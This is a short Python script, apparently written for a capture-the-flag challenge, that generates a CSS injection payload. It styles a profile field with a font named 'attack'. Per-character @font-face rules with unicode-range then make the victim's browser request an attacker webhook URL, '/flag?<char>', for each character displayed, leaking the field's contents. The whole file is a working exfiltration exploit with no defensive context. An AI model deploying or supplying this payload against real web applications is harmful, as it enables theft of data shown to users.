import urllib.parse

SERVER_URL = "https://{your_webhook_url}"
OUTPUT_FILE = "exploit_one_detect.css"
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-"

def generate_css_exploit():
    css_content = '@charset "UTF-8";\n\n'

    css_content += """.profile-info .profile-row:nth-child(4) .value {
    font-family: attack !important;
    font-size: 16px;
    display: inline;
}\n\n"""

    for char in CHARSET:
        encoded_char = urllib.parse.quote(char)
        unicode_hex = f"U+{ord(char):04X}"
        
        css_content += f"""@font-face {{
    font-family: attack;
    src: url('{SERVER_URL}/flag?{encoded_char}');
    unicode-range: {unicode_hex};
}}\n"""

    with open(OUTPUT_FILE, 'w', encoding='utf-8') as f:
        f.write(css_content)
    
    print(f"CSS exploit generated: {OUTPUT_FILE}")

if __name__ == "__main__":
    generate_css_exploit()
